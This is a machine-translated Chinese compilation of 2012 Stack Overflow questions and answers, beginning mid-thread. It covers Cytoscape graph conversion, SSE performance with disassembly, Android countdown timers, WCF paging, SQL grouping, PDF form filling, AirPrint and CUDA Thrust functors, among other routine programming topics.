令我完全惊讶和懊恼的是，“cw”（新的.CytoscapeWindow 方法）出现了指数级的放缓——这根本没有意义。可能您的内存耗尽与此有关，并且是可以修复的。

我将对此进行探索，并可能在下周进行修复。

顺便说一句，您知道可以直接从邻接矩阵创建 graphNEL 吗？

```
g = new ("graphAM", adjMat = matrix, edgemode="directed") 
```

谢谢，伊格纳西奥，你最有帮助的报告。我早就应该做这些计时测试了！

*   保罗

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:32:34.927

自从我使用 Cytoscape 以来已经有一段时间了，所以我不确定该怎么做，但是[手册](http://cytoscape.org/manual/Cytoscape2_6Manual.html#Delimited%20Text%20Table%20and%20Excel%20Workbook)指出您可以使用“表格导入”功能将文本文件用作输入。

`igraph`您可以使用该功能以`write.graph()`多种方式导出图形。通过这种方式，您可以避免必须转换为`graphNEL`可能足以不会耗尽内存的对象。

# c++ - SSE 比常规函数慢得多

> ID：10102357
> 
> 赞同：3
> 
> 时间：2012-04-11T08:23:42.690
> 
> 标签：c++, visual-studio-2010, windows-forms-designer, sse

我正在使用 SSE 制作 Julia 集可视化。这是我的代码类和运算符

```
class vec4 {
    public:
        inline vec4(void) {}
        inline vec4(__m128 val) :v(val) {}

        __m128 v;

        inline void operator=(float *a) {v=_mm_load_ps(a);}
        inline vec4(float *a) {(*this)=a;} 
        inline vec4(float a) {(*this)=a;}

        inline void operator=(float a) {v=_mm_load1_ps(&a);}

};

inline vec4 operator+(const vec4 &a,const vec4 &b) { return _mm_add_ps(a.v,b.v); }
inline vec4 operator-(const vec4 &a,const vec4 &b) { return _mm_sub_ps(a.v,b.v); }
inline vec4 operator*(const vec4 &a,const vec4 &b) { return _mm_mul_ps(a.v,b.v); }
inline vec4 operator/(const vec4 &a,const vec4 &b) { return _mm_div_ps(a.v,b.v); }
inline vec4 operator++(const vec4 &a)
{
    __declspec(align(16)) float b[4]={1.0f,1.0f,1.0f,1.0f};
    vec4 B(b);
    return _mm_add_ps(a.v,B.v); 
} 
```

函数本身：

```
vec4 TWO(2.0f);
vec4 FOUR(4.0f);
vec4 ZER(0.0f);

vec4 CR(cR);
vec4 CI(cI);

for (int i=0; i<320; i++) //H
{
    float *pr = (float*) _aligned_malloc(4 * sizeof(float), 16); //dynamic

    __declspec(align(16)) float pi=i*ratioY + startY;

    for (int j=0; j<420; j+=4) //W
    {

        pr[0]=j*ratioX + startX;
        for(int x=1;x<4;x++)
        {
            pr[x]=pr[x-1]+ratioX;
        }

        vec4 ZR(pr);
        vec4 ZI(pi);

        __declspec(align(16)) float color[4]={0.0f,0.0f,0.0f,0.0f};

        vec4 COLOR(color);
        vec4 COUNT(0.0f);

        __m128 MASK=ZER.v;

        int _count;
        enum {max_count=100};
        for (_count=0;_count<=max_count;_count++) 
        {

            vec4 tZR=ZR*ZR-ZI*ZI+CR;
            vec4 tZI=TWO*ZR*ZI+CI;
            vec4 LEN=tZR*tZR+tZI*tZI;

            __m128 MASKOLD=MASK;
            MASK=_mm_cmplt_ps(LEN.v,FOUR.v);

            ZR=_mm_or_ps(_mm_and_ps(MASK,tZR.v),_mm_andnot_ps(MASK,ZR.v));
            ZI=_mm_or_ps(_mm_and_ps(MASK,tZI.v),_mm_andnot_ps(MASK,ZI.v));

            __m128 CHECKNOTEQL=_mm_cmpneq_ps(MASK,MASKOLD);    
            COLOR=_mm_or_ps(_mm_and_ps(CHECKNOTEQL,COUNT.v),_mm_andnot_ps(CHECKNOTEQL,COLOR.v));

            COUNT=COUNT++;
            operations+=17;

            if (_mm_movemask_ps((LEN-FOUR).v)==0) break; 
        }
        _mm_store_ps(color,COLOR.v); 
```

SSE 需要 553k 操作（mull、add、if）并且需要大约 320ms 来完成任务，而常规函数需要 1428k 操作但只需要大约 90ms 来计算？我使用了 vs2010 性能分析器，似乎所有的数学运算符都运行得很慢。我做错了什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T09:58:36.910

您遇到的问题是 SSE 内在函数比非 SSE 版本执行的内存操作要多得多。使用你的矢量类我写了这个：

```
int main (int argc, char *argv [])
{
  vec4 a (static_cast <float> (argc));
  cout << "argc = " << argc << endl;
  a=++a;
  cout << "a = (" << a.v.m128_f32 [0] << ", " << a.v.m128_f32 [1] << ", " << a.v.m128_f32 [2] << ", " << a.v.m128_f32 [3] << ", " << ")" << endl;
} 
```

它在发布版本中产生了以下操作（我已对此进行了编辑以仅显示 SSE）：

```
fild        dword ptr [ebp+8] // load argc into FPU
fstp        dword ptr [esp+10h] // save argc as a float

movss       xmm0,dword ptr [esp+10h] // load argc into SSE
shufps      xmm0,xmm0,0 // copy argc to all values in SSE register
movaps      xmmword ptr [esp+20h],xmm0 // save to stack frame

fld1 // load 1 into FPU
fst         dword ptr [esp+20h] 
fst         dword ptr [esp+28h] 
fst         dword ptr [esp+30h] 
fstp        dword ptr [esp+38h] // create a (1,1,1,1) vector
movaps      xmm0,xmmword ptr [esp+2Ch] // load above vector into SSE
addps       xmm0,xmmword ptr [esp+1Ch] // add to vector a
movaps      xmmword ptr [esp+38h],xmm0 // save back to a 
```

注意：地址是相对于 ESP 的，有一些推送解释了相同值的偏移量的奇怪变化。

现在，将代码与此版本进行比较：

```
int main (int argc, char *argv [])
{
  float a[4];
  for (int i = 0 ; i < 4 ; ++i)
  {
    a [i] = static_cast <float> (argc + i);
  }
  cout << "argc = " << argc << endl;
  for (int i = 0 ; i < 4 ; ++i)
  {
    a [i] += 1.0f;
  }
  cout << "a = (" << a [0] << ", " << a [1] << ", " << a [2] << ", " << a [3] << ", " << ")" << endl;
} 
```

编译器为上面创建了这段代码（再次编辑并带有奇怪的偏移量）

```
fild        dword ptr [argc] // converting argc to floating point values
fstp        dword ptr [esp+8] 
fild        dword ptr [esp+4] // the argc+i is done in the integer unit
fstp        dword ptr [esp+0Ch] 
fild        dword ptr [esp+8] 
fstp        dword ptr [esp+18h]
fild        dword ptr [esp+10h]
fstp        dword ptr [esp+24h] // array a now initialised

fld         dword ptr [esp+8] // load a[0]
fld1 // load 1 into FPU
fadd        st(1),st // increment a[0]
fxch        st(1)
fstp        dword ptr [esp+14h] // save a[0]
fld         dword ptr [esp+1Ch] // load a[1]
fadd        st,st(1) // increment a[1]
fstp        dword ptr [esp+24h] // save a[1]
fld         dword ptr [esp+28h] // load a[2]
fadd        st,st(1) // increment a[2]
fstp        dword ptr [esp+28h]  // save a[2]
fadd        dword ptr [esp+2Ch] // increment a[3]
fstp        dword ptr [esp+2Ch] // save a[3] 
```

在内存访问方面，增量需要：

```
SSE                  FPU
4xfloat write        1xfloat read
1xsse read           1xfloat write
1xsse read+add       1xfloat read
1xsse write          1xfloat write
                     1xfloat read
                     1xfloat write
                     1xfloat read
                     1xfloat write

total
8 float reads        4 float reads
8 float writes       4 float writes 
```

这表明 SSE 使用的内存带宽是 FPU 版本的两倍，内存带宽是主要瓶颈。

如果您想认真地最大化 SSE，那么您需要在单个 SSE 汇编器函数中编写整个算法，以便您可以尽可能地消除内存读/写。使用内在函数并不是优化的理想解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T17:37:28.943

这是另一个示例（Mandelbrot 集），它与 基于[http://www.iquilezles.org/www/articles/sse/的 Julia 集算法](http://www.iquilezles.org/www/articles/sse/sse.htm)[http://pastebin.com/J90paPVC的实现方式几乎相同](http://pastebin.com/J90paPVC)[sse.htm](http://www.iquilezles.org/www/articles/sse/sse.htm)。同样的故事 FPU>SSE 我什至跳过了一些不相关的操作。任何想法如何做对？

# android - 如何在数字时钟中显示剩余时间？

> ID：10102358
> 
> 赞同：1
> 
> 时间：2012-04-11T08:23:43.610
> 
> 标签：android, clock

正在为学生创建一个应用程序。我需要显示剩余时间的数字时钟。
在这里我添加了数字时钟
![在此处输入图像描述](../Images/d7d2cf950d4c2e6c67213e558172e66e.png)
，但它显示系统日期
，我需要显示剩余时间意味着假设如果考试时间是 10 分钟，那么它必须
以相反的方式显示时间。或者我需要使用另一个时钟。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:47:32.343

在 onCreate 中定义此代码。

```
// 5000 is the starting number (in milliseconds)
// 1000 is the number to count down each time (in milliseconds)
MyCount counter = new MyCount(5000, 1000);
counter.start(); 
```

CountDownTimer 的构造函数如下。

```
// countdowntimer is an abstract class, so extend it and fill in methods
public class MyCount extends CountDownTimer{

public MyCount(long millisInFuture, long countDownInterval) {
    super(millisInFuture, countDownInterval);
}

@Override
public void onFinish() {
tv.setText(”done!”);   //TextView object should be defined in onCreate
}

    @Override
public void onTick(long millisUntilFinished) {
tv.setText(”Left: ” + millisUntilFinished/1000);// This will be called every Second.

}
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:40:25.233

看看[`CountDownTimer`](http://developer.android.com/reference/android/os/CountDownTimer.html)-class。

# asp.net - 调用 WCF 函数时出现消息“底层连接已关闭”

> ID：10102363
> 
> 赞同：0
> 
> 时间：2012-04-11T08:24:10.523
> 
> 标签：asp.net, asp.net-mvc, wcf

最初，我从我的控制器调用了我的 Web 服务中的一个函数，然后我对结果进行分页以仅在我的视图中显示 10 个项目。我是这样进行的：

控制器：

```
 public ActionResult Index(int? page)
    {
        var companies = _requestServiceClient.GetCompanies();
        int currentPageIndex = page.HasValue ? page.Value - 1 : 0;
        var companiesListPaged = companies.ToPagedList(currentPageIndex, defaultPageSize);
        return View(companiesListPaged);
    } 
```

服务：

```
 public IEnumerable<Company> GetCompanies()
    {
        using (var unitOfWork = UnitOfWorkFactory.Create())
        {
            var companyRepository = unitOfWork.Create<Company>();
            return companyRepository.GetAll().MyInclude(x => x.City).ToList();
        }
    } 
```

因此，在从我的服务中检索到所有数据后，分页就完成了。它可以工作，但是传输了很多数据，因此效率不高。我更改了代码以直接在服务中执行分页工作，如下所示：

控制器：

```
 [Authorize]
    public ActionResult Index(int? page)
    {
        int currentPageIndex = page.HasValue ? page.Value - 1 : 0;
        var companies = _requestServiceClient.GetCompaniesToPagedList(currentPageIndex, defaultPageSize);
        return View(companies);
    } 
```

服务：

```
 public IPagedList<Company> GetCompaniesToPagedList(int PageIndex, int PageSize)
    {
        using (var unitOfWork = UnitOfWorkFactory.Create())
        {
            var companyRepository = unitOfWork.Create<Company>();
            var companies = companyRepository.GetAll().MyInclude(x => x.City).ToList();
            return companies.ToPagedList(PageIndex, PageSize);
        }
    } 
```

它编译但在运行时我得到了错误：

**底层连接已关闭：服务器关闭了预期保持活动状态的连接。**

任何想法？为什么我的代码中的这种更改会给我这个错误？

我没有改变其他任何东西。

谢谢。

* * *

**更新**

这是 IPagedList 的代码

```
public interface IPagedList<T> : IList<T>
{
    int PageCount { get; }
    int TotalItemCount { get; }
    int PageIndex { get; }
    int PageNumber { get; }
    int PageSize { get; }
    bool HasPreviousPage { get; }
    bool HasNextPage { get; }
    bool IsFirstPage { get; }
    bool IsLastPage { get; }
} 
```

对于 ToPagedList

```
 public static IPagedList<T> ToPagedList<T>(this IEnumerable<T> source, int pageIndex, int pageSize, int? totalCount = null)
    {
        return new PagedList<T>(source, pageIndex, pageSize, totalCount);
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:28:48.667

我建议检查调用返回的数据量是否可能超过 Binding 的 ReaderQuotas 元素中定义的限制。

# c# - 如何按时间日期列对gridview列进行排序？

> ID：10102365
> 
> 赞同：0
> 
> 时间：2012-04-11T08:24:21.993
> 
> 标签：c#, asp.net, sql

简单的网格视图。SqlData 源将数据绑定到gridview。一个名为 Date ( type date ) 的列，我在其中添加了我编辑某些内容的日期。

我想按日期列对整个 gridview 列进行排序。

知道我该怎么做吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:29:23.010

1.  因为这是一个`Page level`问题。所以你可以先保持`GridView DataSource`在`ViewState`
2.  在您的标题中和`Postback`从`ViewState`. 根据所需参数对其进行排序。再次将其绑定到`GridView`.

**[此处](http://forums.asp.net/p/956540/1177923.aspx)**和**[此处的](https://stackoverflow.com/questions/702600/sorting-and-paging-with-gridview-asp-net)**示例

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T17:14:44.383

一种简单的方法是在 SQL 选择语句中添加一个附加列。这个额外的列将是可用于排序的格式的编辑日期（YYYYMMDD 格式）：

```
CONVERT(VARCHAR(8), [Date], 112) as sortedDate 
```

然后更改您的编辑日期字段以使用您的排序日期字段作为排序表达式：

```
<asp:BoundField DataField="Date" HeaderText="Edit Date" SortExpression="sortedDate"/> 
```

# wordpress - Wordpress - 编辑每篇博文的结尾

> ID：10102367
> 
> 赞同：0
> 
> 时间：2012-04-11T08:24:27.183
> 
> 标签：wordpress, file, post, blogs

我需要在 wordpress 中编辑什么文件来更改每篇博文的底部？

因此，如果我想在每篇博文的底部添加社交媒体按钮。

[http://angeloesposito.com/view/blog/](http://angeloesposito.com/view/blog/)

谢谢你，艺术

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:30:43.363

您可以使用插件来做到这一点，只需在谷歌中搜索“wordpress 社交按钮插件”，或者您将不得不编辑多个文件来更改帖子的设计，并且必须访问每个社交网络，所以我想更好使用插件:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:45:37.413

loop.php 我想这就是你要找的

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-12T10:35:37.290

实际上 - single.php 是呈现博客文章的页面。loop.php 将是特定于模板的，不会出现在所有模板中，Evan 的回答在技术上并不能回答你的问题。

因此，任何人在您的模板文件夹中搜索 - single.php 都是呈现您的单个博客文章页面的文件。在博文之后添加一些内容直接在 the_content() 之后添加

一些帖子将引用 loop.php（包括默认模板） - 在那里你会找到 the_content()

# sql - 我是否正确分组？

> ID：10102370
> 
> 赞同：0
> 
> 时间：2012-04-11T08:24:48.657
> 
> 标签：sql

我有一个记录错误的系统。从我的错误表中选择：

```
SELECT message, personid, count(*)
FROM errorlog
WHERE time BETWEEN TO_DATE(foo) AND TO_DATE(foo) AND substr(message,0,3) = 'ERR'
GROUP BY personid, message
ORDER BY 3 
```

我想要看看是否有任何用户比其他用户“产生”更多错误。例如 ERROR FOO，如果用户 A 有 4 个错误，而用户 B 有 4000 个错误，那么逻辑让我觉得用户 B 做错了什么。

但是我可以按照我的方式分组吗？这是一个修改版本，其中选择仅对消息进行分组并对其进行计数，从而解决了 ERROR FOO 在我的示例中导致 4004 的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:29:21.260

通过您的查询，如果消息不同，那么您将获得每人多条记录。

如果您只想要每人一条记录，则需要在周围放置一个[聚合函数](http://en.wikipedia.org/wiki/Aggregate_function)`message`

例如你可以这样做：

```
SELECT MIN(message), personid, count(*)
FROM errorlog
WHERE time BETWEEN TO_DATE(foo) AND TO_DATE(foo) AND substr(message,0,3) = 'ERR'
GROUP BY personid, message
ORDER BY 3 
```

在这里，我已更改`message`为`MIN(message)`which 将按`message`字母顺序返回此人的第一个。

* * *

但是，如果您乐于为每个人返回多条记录，那么我认为您的脚本没有问题。它将显示表中最多的列表`personid`并按`message`其排序，仅显示以`message`开头的记录`ERR`

# c# - Visual Studio 安装程序 > PostBuildEvent 错误代码“1”

> ID：10102374
> 
> 赞同：2
> 
> 时间：2012-04-11T08:24:59.437
> 
> 标签：c#, visual-studio-2010, installation, post-build-event

我正在尝试在 Visual Studio 2010 中使用 PostBuildEvent 运行 .js 文件，但当我使用错误代码构建解决方案时失败

错误 2 'PostBuildEvent' 失败，错误代码 '1' 'Error no especificado'

我已经检查了我的项目和 js 文件中的文件名、路径和代码，一切似乎都正确...... js 文件包含这个

```
// http://blogs.msdn.com/b/heaths/archive/2006/02/01/64-bit-managed-custom-actions-with-visual-studio.aspx
var msiOpenDatabaseModeTransact = 1;
var msiViewModifyUpdate = 2

var filespec = WScript.Arguments(0);
var projdir = WScript.Arguments(1);
var installer = WScript.CreateObject("WindowsInstaller.Installer");
var database = installer.OpenDatabase(filespec, msiOpenDatabaseModeTransact);

// Update the Binary table...
var sql = "SELECT `Name`,`Data` FROM `Binary` where `Binary`.`Name` = 'InstallUtil'";
var view = database.OpenView(sql);
view.Execute();
var record = view.Fetch();
record.SetStream(2, projdir + "InstallUtilLib.dll");
view.Modify(msiViewModifyUpdate, record);
view.Close();
database.Commit(); 
```

有人已经解决了这样的问题吗？任何帮助，请...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:31:58.133

由于您使用的是 Visual Studio 安装程序，因此 JS 文件的位置也很重要。您的 js 文件应与安装项目的 .vdproj 文件位于同一目录中。

这应该对您有所帮助 [http://blogs.msdn.com/b/astebner/archive/2006/08/12/696833.aspx](http://blogs.msdn.com/b/astebner/archive/2006/08/12/696833.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T17:22:24.183

在拼命尝试解决问题的过程中，我找到了解决方案。检查完其他所有内容后，我将我的项目移动到另一个文件夹，我发现路径太长了。

我的项目路径尽管少于 255 个字符（如 Microsoft 站点所示），但仍会导致 Visual Studio 2010 返回此错误。

[http://msdn.microsoft.com/en-us/library/windows/desktop/aa365247(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365247(v=vs.85).aspx)

但请注意，在其他情况下，可能是由于其他错误导致的一点解释性错误。在我的情况下解决了这个问题。

# java - 使用 Java 编辑 PDF 文件

> ID：10102384
> 
> 赞同：3
> 
> 时间：2012-04-11T08:25:36.143
> 
> 标签：java, pdf, printing, itext

我正在尝试编辑现有的 PDF 文件。这是一个文件，我需要在其中填写一些地址和其他内容。我想将地址簿连接到应用程序，以便用户可以从地址簿中选择一个用户，并自动填写一部分。

我的问题是：

1.  是否可以编辑现有的 PDF 文件并填写一些字段（+/- 20），因为我知道有 Itext（http://www.itextpdf.com），但我读到可能性很小。
2.  或者我可以更好地将 PDF 转换为 JPG 并将其作为背景。并在我需要填写字段的地方创建 JLabels。然后在 A4 上打印整个框架。
3.  还是有更好的可能性？

所以我需要做的，一步一步：

*   选择其中一个 PDF（它们在程序中）
*   用内容/地址填写一些字段
*   使用打印机打印 PDF/表格

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:36:14.770

Adobe 提供了一个名为 [Acrobat Forms Data Format (FDF) Toolkit](http://www.adobe.com/devnet/acrobat/fdftoolkit.html)的工具包，它为不同的语言提供 API 来填写表格。

您可以在该页面底部获取 java 代码或查看此[链接](http://download.macromedia.com/pub/developer/acrobat/FDFToolkitForJava.zip)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:07:23.150

您可以使用 pdf 表单并使用[IText](http://itextpdf.com/examples/iia.php?id=157)或[Apache PDFBox 以](http://pdfbox.apache.org/apidocs/org/apache/pdfbox/examples/fdf/SetField.html)编程方式编辑字段值（下载 pdfbox 并查看 SetField.java 示例）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T09:19:06.620

我们没有编辑现有的 PDF，而是使用[iReport从我们的 java 应用程序中创建了全新的信件/报告/doco](http://jasperforge.org/projects/ireport)

# jquery - jquery 表单插件响应去除了 IE 中的标签

> ID：10102385
> 
> 赞同：1
> 
> 时间：2012-04-11T08:25:36.237
> 
> 标签：jquery, ajax, forms

[使用jQuery From Plugin](http://malsup.com/jquery/form/)遇到了一个奇怪的问题。我看到的问题只发生在 IE 中。问题是使用 IE 时的 ajax 响应会去除表单标签。

```
<form id="the-form" method="post" action="url">
    // Fields
    <input type="submit" value="Submit" />
</form>
<input type="hidden" id="_keepDialog" /> 
```

和脚本：

```
$('#the-form input[type="submit"]').click( function (ev) {
    ev.preventDefault();
    $('#the-form').ajaxSubmit({ 
        sucess: function (html) {
            alert(html.indexOf('_keepDialog'));
        }
    });
}; 
```

这将在 jQuery 对话框中使用。显示对话框后，使用 $.ajax 从完全相同的 url 加载内容。内容在该电话中恢复正常。但是，当通过 .ajaxSubmit 提交时，作为响应返回的 html 缺少最外层的标签，并且这只发生在 IE 中。我使用提琴手检查在后台传输的内容，并且在所有情况下都会返回正确的响应（包括表单和隐藏标签），但是随后在 jQuery 中发生了一些事情，将响应设置为表单 innerHTML。

我正在查看 jQuery.form 插件中的条件代码，它为 IE 做了一些不同的事情，但无法弄清楚。

对于任何 IE 浏览器，上述代码的警报值将是 -1，对于任何其他浏览器，警报值将大于零。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T16:45:53.337

Be advised that this is voodoo, but what worked for me is to add an empty pre tag in front of the form tag - then IE wouldn't strip the form tag anymore...

# asp.net - Microsoft Reporting WebForms 报表查看器 - 导出到 Excel

> ID：10102391
> 
> 赞同：0
> 
> 时间：2012-04-11T08:25:47.720
> 
> 标签：asp.net, .net, webforms, reportviewer

我有一个用于导出到 PDF 和 Excel 的报告查看器。有时表中的某些数据比单行更长。

当导出为 PDF 时，需要更多高度的字段会自动给出。然而，当我导出到 excel 时，它保持在原始高度并且不会增长以显示所有数据。

我希望单元格高度自动增长以在屏幕上显示所有数据。我已经设置`CanGrow`了，`true`但这没有任何效果（除了在导出为 PDF 时工作）。

以前有没有人遇到过这个问题并可以分享解决方案？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T12:30:19.553

好的，在没有收到任何答案后，我自己钻研了这个。

当单元格是多个合并的单元格时，文本似乎不会在 excel 中换行。

因此，在报表查看器中，如果所有文本区域和项目没有相互对齐，或者如果一个是另外两个的两倍，那么它们将被放置在合并的单元格中以弥补交叉。

这意味着这些可能不是问题的解决方案，除非您的所有文本区域的宽度都相同，或者您可以更改布局，以便那些需要换行到新行的区域只会占用一个单元格。

我通过将所有内容放在一个表格中来做到这一点，并且知道如果我合并任何单元格，那么文本换行将是不可能的。

我希望这会帮助那里的人！

# iphone - iOS AirPrint - 打印多个 URL

> ID：10102392
> 
> 赞同：1
> 
> 时间：2012-04-11T08:25:52.330
> 
> 标签：iphone, ios, uiwebview, ios5.1, airprint

按照这篇文章的问题： [无法使用 AirPrint 显示打印机选项](https://stackoverflow.com/questions/4275646/unable-to-display-printer-options-with-airprint)

我有几个问题：

1）答案之一是将 Controller.printItem 设置为 URL。同样，我可以设置多个 URL 吗？基本上，我有一组需要一次性打印的 URL。是否可以将 controller.printitems 设置为 URL 数组？另外，我知道 controller.printItem 采用“数据”类型，那么如何将基于 Web 的图像 URL 转换为“数据”类型？

2）由于某种奇怪的原因，默认情况下，每次我到达打印对话框时，双面都设置为打开。我需要设置什么变量？如果我不能向用户显示该选项，那就太好了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T11:14:26.107

试试这个代码可能对你有帮助

```
- (IBAction)btnPrintTapped:(id)sender {
    NSData *imageData = UIImagePNGRepresentation(self.imgV.image);
    [self printItem:imageData];
}

#pragma mark - Printing 

-(void)printItem :(NSData*)data {
    printController = [UIPrintInteractionController sharedPrintController];
    if(printController && [UIPrintInteractionController canPrintData:data]) {
        printController.delegate = self;
        UIPrintInfo *printInfo = [UIPrintInfo printInfo];
        printInfo.outputType = UIPrintInfoOutputGeneral;
        printInfo.jobName = [NSString stringWithFormat:@""];
        printInfo.duplex = UIPrintInfoDuplexLongEdge;
        printController.printInfo = printInfo;
        printController.showsPageRange = YES;
        printController.printingItem = data;
        void (^completionHandler)(UIPrintInteractionController *, BOOL, NSError *) = ^(UIPrintInteractionController *printController, BOOL completed, NSError *error) {
            if (!completed && error) {
                //NSLog(@"FAILED! due to error in domain %@ with error code %u", error.domain, error.code);
            }
        };
        [printController presentFromBarButtonItem:self.item animated:YES completionHandler:completionHandler];
    }
}

- (BOOL)presentFromRect:(CGRect)rect inView:(UIView *)view animated:(BOOL)animated completionHandler:(UIPrintInteractionCompletionHandler)completion {
    return YES;
}

- (BOOL)presentFromBarButtonItem:(UIBarButtonItem *)item animated:(BOOL)animated completionHandler:(UIPrintInteractionCompletionHandler)completion {
    return YES;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-18T09:23:32.783

我知道它很晚，但如果有人需要这个可能会有所帮助：创建 URL 数组并将其分配给“UIPrintInteractionController”类的“printingItems”属性。

# iphone - 如何以编程方式获取应用程序使用的存储状态？

> ID：10102407
> 
> 赞同：0
> 
> 时间：2012-04-11T08:27:07.410
> 
> 标签：iphone, ios, data-storage

我有一个应用程序可以存储图像和文本等用户数据。我想显示我的应用程序消耗了多少磁盘空间。这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:43:42.580

我不知道这三个，但我已经做了一些事情来通过文件管理器获取目录中文档的大小，这可能会对你有所帮助，这里是代码

```
[[NSFileManager defaultManager] fileExistsAtPath:path isDirectory:&isDir];
        if (isDir) {
            NSPipe *pipe = [NSPipe pipe];
            NSTask *t = [[[NSTask alloc] init] autorelease];
            [t setLaunchPath:@"/usr/bin/du"];
            [t setArguments:[NSArray arrayWithObjects:@"-k", @"-d", @"0", path, nil]];
            [t setStandardOutput:pipe];
            [t setStandardError:[NSPipe pipe]];

            [t launch];

            [t waitUntilExit];

            NSString *sizeString = [[[NSString alloc] initWithData:[[pipe fileHandleForReading] availableData] encoding:NSASCIIStringEncoding] autorelease];
            sizeString = [[sizeString componentsSeparatedByString:@" "] objectAtIndex:0];
            bytes = [sizeString longLongValue]*1024;
        }
        else {
            bytes = [[[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil] fileSize];
        } 
```

bytes 将返回您的大小

# url - 登录失败时将用户从 Moodle 重定向到另一个站点

> ID：10102411
> 
> 赞同：2
> 
> 时间：2012-04-11T08:27:34.513
> 
> 标签：url, redirect, login, moodle, bounce

我编写了一个允许 url 登录的自定义插件。以这种方式进入我的 Moodle 站点的用户，都来自同一个外部站点，并且可以根据 url 进行识别。当他们的登录失败时，我想将他们重定向回外部网站上的“登录失败”页面，而不是我自己的 moodle 网站上的正常登录失败例程。

Moodle 中是否有从身份验证插件中重定向用户的功能？部分问题在于，在处理插件时，标头已经被处理。因此，在标题中设置变量无效。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-12T10:18:16.027

我相信您可以`loginpage_hook()`在您的身份验证插件中执行此操作，因为这是在输出之前调用的，然后 `redirect()`在您的插件中使用 moodle 函数。请参阅[auth/ldap/auth.php](http://git.moodle.org/gw?p=moodle.git;a=blob;f=auth/ldap/auth.php#l1487)以获得这样做的重要示例。

# css - 如何在非 GWT 页面中使用标准 GWT CSS 样式主题？

> ID：10102415
> 
> 赞同：0
> 
> 时间：2012-04-11T08:27:49.557
> 
> 标签：css, gwt

我编写了一个 GWT 应用程序和一个介绍该应用程序的静态介绍页面。事实证明，将介绍作为单独的 .jsp 页面而不是应用程序的一部分会很方便；但是，我希望应用程序和介绍页面的 CSS 样式相同。如何为静态或 .jsp 页面包含与 GWT 应用程序相同的 GWT CSS 样式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:25:33.850

只需像标准网页一样包含它

```
<link rel="stylesheet" type="text/css" href="{Path to css here}"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:54:11.260

例如使用 gwt 提供的 Clean css，在 projectname.gwt.xml 中定义：

```
<inherits name='com.google.gwt.user.theme.clean.Clean'/> 
```

您的 CSS 将存储在：

/projectname/gwt/clean/clean.css

你是这个意思吗？

# c - 绘制直方图

> ID：10102416
> 
> 赞同：2
> 
> 时间：2012-04-11T08:27:56.540
> 
> 标签：c

我正在编写一个函数来绘制直方图，但我遇到了一个问题。这是代码

```
void plotHist(int num, regression *r, histData *h)
{
   int i, j;
   for (i = 0; i< h->numHist; i++)
   {
       printf("%2f\t|", h->hist[i].xValue) ;
           for ( j = 0 ; j < h->hist[i].yFrequency/5; j ++)
           {
               printf("*");

           }

        printf("\n");
    }

} 
```

我在屏幕上得到的结果是：

```
 -199.422 |  
                -142.232 |****
                -98.232  |******
                -21.32   |***********
                 43.424  |****************
                 58.234  |***************
                 92.123  |*********
                 189.5   |**** 
```

问题是我必须通过“o”字母向这个直方图添加另一个数组，我不知道该怎么做。结果应该是这样的：

```
 -199.422 |  o
        -142.232 |****o
        -98.232  |******o
        -21.32   |********o**
        43.424   |**********o*****
        58.234   |********o******
        92.123   |******o**
        189.5    |****o 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:39:09.493

不要立即使用 printf 打印直方图。相反，在打印之前弄清楚所有数据点的位置。这样，您不必在打印字符时检查每个数据，并且第二个数组不必位于直方图的绘制区域内。

# cuda - 推力函子：“启动请求的资源过多”

> ID：10102417
> 
> 赞同：1
> 
> 时间：2012-04-11T08:27:57.403
> 
> 标签：cuda, thrust

我正在尝试在 CUDA 中实现类似的东西：

对于每个元素

```
p = { p if p >= floor
      z if p < floor 
```

where`floor`和`z`是在测试开始时配置的常量。

我试图像这样实现它，但我收到错误“请求启动的资源太多”

一个函子：

```
struct floor_functor : thrust::unary_function <float, float>
{
        const float floorLevel, floorVal;

        floor_functor(float _floorLevel, float _floorVal) : floorLevel(_floorLevel), floorVal(_floorVal){}

        __host__
        __device__
        float operator()(float& x) const
        {
            if (x >= floorLevel)
                return x;
            else
                return floorVal;
        }
}; 
```

由变换使用：

```
thrust::transform(input->begin(), input->end(), output.begin(), floor_functor(floorLevel, floorVal)); 
```

如果我删除我的仿函数的一个成员，比如说`floorVal`，并使用一个只有一个成员变量的仿函数，它就可以正常工作。

有谁知道为什么会这样，我该如何解决？

**附加信息：**

我的数组长 786432 个元素。

我的 GPU 是 GeForce GTX590

我正在使用以下命令进行构建：

```
`nvcc -c -g -arch sm_11 -Xcompiler -fPIC -Xcompiler -Wall -DTHRUST_DEBUG  -I <my_include_dir> -o <my_output> <my_source>` 
```

